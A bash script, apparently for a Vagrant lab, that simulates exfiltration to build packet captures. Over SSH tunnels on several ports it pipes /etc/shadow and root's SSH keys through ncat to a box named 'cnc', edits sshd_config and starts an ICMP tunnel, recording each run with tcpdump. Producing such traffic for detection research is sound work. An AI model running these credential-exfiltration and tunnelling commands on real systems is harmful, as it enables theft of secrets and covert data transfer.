#!/bin/bash

PCAP_DIR="/vagrant/pcap"
SCRIPT_DIR="`pwd`/scripts"
SLEEP_INTERVAL='1'
MONITORING_BOX='tap'
SENDER_BOX='host'
LISTENER_BOX='cnc'

FILES=( '/etc/shadow' '/root/.ssh/id_rsa' '/root/.ssh/id_rsa.pub' )
PORTS=( '53' '22' '80' '443' )

IP_PROTOCOLS=( 't' 'u' )
IP_VERSIONS=( '4' '6' )

LISTENER_IP4='192.168.12.12'
LISTENER_IP6='2a02:1010:12::12'

TUN64_MODES=( 't6over4' 't6to4' 'isatap' )

die() { 
    echo "$@" 1>&2
    exit 1
}

SSH () {
    BOX=$1
    CMD=$2
    vagrant ssh $BOX -c "$CMD"
}

start_tcpdump_listener () {

    if [[ $# -ne 2 ]]; then
        die "Illegal number of arguments for tcpdump listener, must be 2"
    fi

    INTERFACE=$1
    PCAP_NAME=$2

    # Clean up any existing 
    kill_tcpdump_listener
    echo "Creating PCAP folder"

    SSH $MONITORING_BOX "sudo mkdir -p $PCAP_DIR"
    echo "starting tcpdump for $PCAP_NAME.pcap in folder $PCAP_DIR"
    SSH $MONITORING_BOX "nohup sudo tcpdump -i $INTERFACE -w $PCAP_DIR/$PCAP_NAME.pcap & sleep 1"

    echo "sleeping after sending data"
    sleep $SLEEP_INTERVAL
}

kill_tcpdump_listener () {
    echo "killing tcpdump"
    SSH $MONITORING_BOX "sudo pkill tcpdump"
    sleep $SLEEP_INTERVAL
}

iterate_ssh_tunnels () {
    for version in "${IP_VERSIONS[@]}"; do
        for port in "${PORTS[@]}"; do
        #echo "Initiating port $port test"

            case $version in
                4)
                ESTABLISH="ssh -i /home/vagrant/.ssh/id_rsa -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no vagrant@$LISTENER_IP4 -L 4444:$LISTENER_IP4:4444 -N -f -p $port"
                LISTEN_DATA="ncat -l -p 4444 -k"
                SEND_DATA="ncat 127.0.0.1 4444"
                ;;
                6)
                ESTABLISH="ssh -i /home/vagrant/.ssh/id_rsa -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -6 vagrant@$LISTENER_IP6 -L 6666:\[$LISTENER_IP6\]:6666 -N -f -p $port"
                LISTEN_DATA="ncat -6 -l -p 6666 -k"
                SEND_DATA="ncat -6 ::1 6666"
                ;;
                *)
                die "No IP version argument"
                ;;
            esac

            exec_ssh_tunnel

        done
    done
}

exec_ssh_tunnel () {

    ITERATION_NAME="ssh-$version-$port"

    # Cleanup just in case
    SSH $LISTENER_BOX "sudo pkill ncat"
    kill_tcpdump_listener

    reconfigure_ssh_listener add $port
    start_tcpdump_listener eth1 "$ITERATION_NAME"

    echo "Establishing SSH tunnel for iteration: $ITERATION_NAME"
    SSH $SENDER_BOX "sudo nohup $ESTABLISH" || die "Failed to establish ssh channel"
    for file in "${FILES[@]}"; do
        echo "Starting netcat listener"
        SSH $LISTENER_BOX "sudo nohup $LISTEN_DATA &"
        sleep $SLEEP_INTERVAL
        echo "Sending data"
        SSH $SENDER_BOX "sudo cat $file | sudo $SEND_DATA"
        sleep $SLEEP_INTERVAL
    done

    echo "Cleaning up"
    SSH $LISTENER_BOX "sudo pkill ncat"
    SSH $SENDER_BOX "sudo ps -ef | egrep 'ssh.+id_rsa' | awk -F \" \" '{ print \$2 }' | sudo xargs kill"
    reconfigure_ssh_listener remove $port
    kill_tcpdump_listener
    sleep $SLEEP_INTERVAL
}

reconfigure_ssh_listener () {

    if [[ $# -ne 2 ]]; then
        die "Illegal number of arguments for tcpdump listener, must be 2"
    fi

    PORT=$2

    case $1 in
        add)
            reconfigure_ssh_listener remove $PORT
            echo "Adding SSH port $PORT listener"
            DO_CMD="sed -i -e \"\\\$a\\Port $PORT\" /etc/ssh/sshd_config"
            echo $DO_CMD
            SSH $LISTENER_BOX "sudo $DO_CMD"
        ;;
        remove)
            echo "Removing SSH port $PORT listener"
            SSH $LISTENER_BOX "sudo sed -i \"s/^Port $PORT.*//g\" /etc/ssh/sshd_config"
        ;;
        *)
        die "No IP version argument"
        ;;
    esac  

    echo "Restarting SSH service"
    SSH $LISTENER_BOX "sudo service ssh restart"
    sleep 1

}

exec_ptunnel () {

    ITERATION_NAME="ptunnel"
    # Cleanup just in case
    SSH $LISTENER_BOX "sudo pkill ncat"
    kill_tcpdump_listener
    start_tcpdump_listener eth1 "$ITERATION_NAME"

    SSH $LISTENER_BOX "sudo /vagrant/scripts/ptunnel_listener.sh &"

    kill_tcpdump_listener

}

mkdir -p $SCRIPT_DIR

cat <<EOF > $SCRIPT_DIR/ptunnel_listener.sh
#!/bin/bash
echo Starting listener...
ncat -l -p 5555 -k &
echo Starting ptunnel proxy...
ptunnel -c eth1 -v 4
EOF

chmod 755 $SCRIPT_DIR/ptunnel_listener.sh

exec_ptunnel